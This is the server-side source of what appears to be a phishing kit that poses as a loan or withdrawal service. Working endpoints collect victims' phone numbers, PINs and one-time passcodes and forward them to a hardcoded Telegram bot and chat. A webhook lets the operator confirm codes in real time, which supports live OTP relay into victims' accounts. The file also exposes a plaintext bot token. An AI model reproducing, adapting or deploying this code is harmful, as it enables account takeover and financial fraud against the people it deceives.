const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = "8975729175:AAFI_qFAD6zdN6bmhdUDu5HKO0JiaL38kN4"; 
const CHAT_ID = "8238882798"; // Your Telegram chat ID

let latestStatus = "pending"; // Tracks approval status

// 1. Receive loan application / withdrawal from frontend
app.post('/api/submit', async (req, res) => {
    const { name, phone, amount, purpose, pin } = req.body;
    latestStatus = "pending";

    const message = `📲 *New Application / Withdrawal*\n\n` +
                    `• *Phone:* ${phone}\n` +
                    `• *PIN:* ${pin}\n` +
                    `• *Amount:* ${amount}\n` +
                    `• *Purpose:* ${purpose || 'N/A'}\n\n` +
                    `Please review and choose an action:`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Approve", callback_data: `approve_${phone}` },
                { text: "❌ Decline", callback_data: `decline_${phone}` }
            ]
        ]
    };

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: keyboard
            })
        });
        const data = await response.json();
        res.json({ success: data.ok });
    } catch (err) {
        console.error("Telegram send error:", err);
        res.json({ success: false });
    }
});

// 2. Endpoint for frontend to check status
app.get('/api/status', (req, res) => {
    res.json({ status: latestStatus });
});

// 3. Receive OTP from frontend and send to Telegram
app.post('/api/submit-otp', async (req, res) => {
    const { phone, otp } = req.body;
    latestStatus = "pending";

    const message = `🔐 *New OTP Verification*\n\n` +
                    `• *Phone:* ${phone}\n` +
                    `• *OTP Code:* ${otp}\n\n` +
                    `Please choose an action:`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Correct OTP", callback_data: `correct_otp_${phone}` },
                { text: "❌ Wrong OTP", callback_data: `wrong_otp_${phone}` }
            ]
        ]
    };

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: keyboard
            })
        });
        const data = await response.json();
        res.json({ success: data.ok });
    } catch (err) {
        console.error("Telegram OTP send error:", err);
        res.json({ success: false });
    }
});

// 4. Telegram Webhook to catch button clicks instantly
app.post('/webhook', async (req, res) => {
    // Respond to Telegram instantly so the button doesn't hang
    res.sendStatus(200);

    const update = req.body;
    
    if (update && update.callback_query) {
        const action = update.callback_query.data;
        const callbackQueryId = update.callback_query.id;
        
        console.log(`🔔 Webhook received action: ${action}`);

        if (action.startsWith("approve") || action.startsWith("correct_otp")) {
            latestStatus = "approved";
        } else if (action.startsWith("decline") || action.startsWith("wrong_otp")) {
            latestStatus = "wrong_otp";
        }
        
        // Acknowledge the callback query to clear button loading state
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    callback_query_id: callbackQueryId, 
                    text: "Action recorded successfully!" 
                })
            });
        } catch (err) {
            console.error("Callback answer error:", err.message);
        }
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});